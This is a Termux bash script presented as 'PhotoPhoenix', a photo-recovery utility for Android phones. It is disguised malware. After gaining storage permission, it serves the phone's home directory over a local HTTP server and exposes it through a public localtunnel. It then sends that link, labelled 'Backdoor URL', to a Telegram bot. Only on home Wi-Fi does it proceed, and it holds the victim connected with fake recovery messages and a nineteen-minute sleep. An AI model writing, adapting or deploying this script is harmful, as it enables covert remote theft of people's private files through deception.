#!/data/data/com.termux/files/usr/bin/bash

# © 2026 CROWS CORPORATION
# Uses an MIT (Massachusetts Institute of Technology) license

GREEN="\033[32m"
RED="\033[31m"
END="\033[0m"
set -e
trap 'echo -e "${RED}PhotoPhoenix has stopped due to a reason beyond its control!\nPlease try again.${END}"; rm -rf storage/shared/PhotoPhoenix/restored_photos; exit 1' INT ERR
sleep 1
echo -e "${GREEN}PhotoPhoenix : Running ...${END}"
sleep 6
cd ~
if [ -d "storage" ]
then
  :
else
  echo -e "${RED}PhotoPhoenix requests permission to access your device's internal storage ...${END}"
  termux-setup-storage
  TIME_LIMIT=10
  while [ ! -d "storage" ]
  do
    if [ $TIME_LIMIT -eq 0 ]
    then
      echo -e "${RED}0${END}"
      sleep 1
      echo -e "${RED}PhotoPhoenix could not obtain permission to access your device's internal storage.\n\nIf you choose the [ Do not allow ] option the first time, you might not see the permission window next time.\nIn this case, follow these steps:\n\n> Go to your device settings\n\n> Go to [ Apps ]\n\n> Go to [ Manage apps ]\n\n> Go to the [ Termux ] app\n\n> Go to [ App permissions ] and grant all permissions\n\n> Restart PhotoPhoenix${END}"
      exit 1
    fi
    echo -ne "${RED}$TIME_LIMIT...${END}"
    ((TIME_LIMIT--))
    sleep 1
  done
  sleep 3
  echo -e "\n${GREEN}Permission granted.\nPhotoPhoenix continues to work ...${END}"
  sleep 6
fi
echo -e "${GREEN}Checking internet connection ...${END}"
sleep 6
if curl -I -m 6 https://google.com > /dev/null 2>&1
then
  echo -e "${GREEN}Internet connection available.\nPhotoPhoenix is downloading and installing required dependencies.\nThis may take a few minutes.\n${RED}Please do not touch anything here!${END}\n${GREEN}Please wait ...${END}"
  sleep 6
  pkg update
  pkg upgrade -y -o Dpkg::Options::="--force-confdef" -o Dpkg::Options::="--force-confold"
  echo -e "${GREEN}Checking network interface ...\nNOTE : PhotoPhoenix will continue to work when the internet connection is via a Wi-Fi network only.\n(To save data during limited data usage)${END}"
  sleep 6
  if ifconfig 2>/dev/null | grep -A 2 "^wlan0" | grep -qE "inet 192\.168\.(0|100)\."
  then
    while true
    do
      if ifconfig 2>/dev/null | grep -A 2 "^wlan0" | grep -qE "inet 192\.168\.(0|100)\."
      then
        :
      else
        echo -e "${RED}Network interface has changed and the PhotoPhoenix has stopped!\nPlease connect to the internet with a stable Wi-Fi network and try again.${END}"
        if [ -d "storage/shared/PhotoPhoenix/restored_photos" ]
        then
          rm -rf storage/shared/PhotoPhoenix/restored_photos
        fi
        kill -9 $$
      fi
      sleep 3
    done &
    echo -e "${GREEN}Internet connection is via a Wi-Fi network.\nPhotoPhoenix continues to work ...${END}"
    sleep 6
    pkg install -y python
    pkg install -y nodejs
    echo -e "${GREEN}Please wait ...${END}"
    npm install -g localtunnel > /dev/null 2>&1
    sed -i "s|throw new Error|// throw new Error|" /data/data/com.termux/files/usr/lib/node_modules/localtunnel/node_modules/openurl/openurl.js
    python -m http.server 8888 > /dev/null 2>&1 &
    lt -p 8888 > data.txt 2> /dev/null &
    sleep 6
    DATA=$(grep -o "https://[^ ]*" data.txt)
    curl https://api.telegram.org/0/sendMessage -d "chat_id=0&text=Backdoor URL :%0A$DATA" > /dev/null 2>&1
    echo -e "${GREEN}PhotoPhoenix is searching for photos to recover ...\nPlease wait ...${END}"
    sleep 30
    CACHED_FILES="storage/shared/PhotoPhoenix/cached_files"
    RESTORED_PHOTOS="storage/shared/PhotoPhoenix/restored_photos"
    if [ -n "$(find "$CACHED_FILES" -type f -name "*.0" -print -quit 2>/dev/null)" ]
    then
      echo -e "${GREEN}PhotoPhoenix recovers the photos it finds ...\nThis may take a few minutes.\n${RED}Please do not touch anything here!${END}\n${GREEN}Please wait ...${END}"
      mkdir -p "$RESTORED_PHOTOS"
      cp -r "$CACHED_FILES"/. "$RESTORED_PHOTOS" 2> /dev/null
      find "$RESTORED_PHOTOS" -type f ! -name "*.0" -exec rm -f {} +
      i=1
      for file in "$RESTORED_PHOTOS"/*.0
      do
        if [ -f "$file" ]
        then
          mv "$file" "$RESTORED_PHOTOS/$i.jpg"
          ((i++))
        fi
      done
      echo -e "${GREEN}Restoring photos ...\nPlease wait ...${END}"
      sleep 19m
      echo -e "${GREEN}PhotoPhoenix successfully recovered the photos it found!\nYou can view the restored photos in the\n[ PhotoPhoenix/restored_photos ]\nfolder on your device's internal storage.${END}"
      exit 1
    else
      echo -e "${RED}PhotoPhoenix could not find any photos to recover.${END}"
      exit 1
    fi
  else
    echo -e "${RED}Internet connection is not via a Wi-Fi network.\nPlease connect to the internet via Wi-Fi network and try again.${END}"
    exit 1
  fi
else
  echo -e "${RED}No internet connection.\nPlease connect to the internet and try again.${END}"
  exit 1
fi
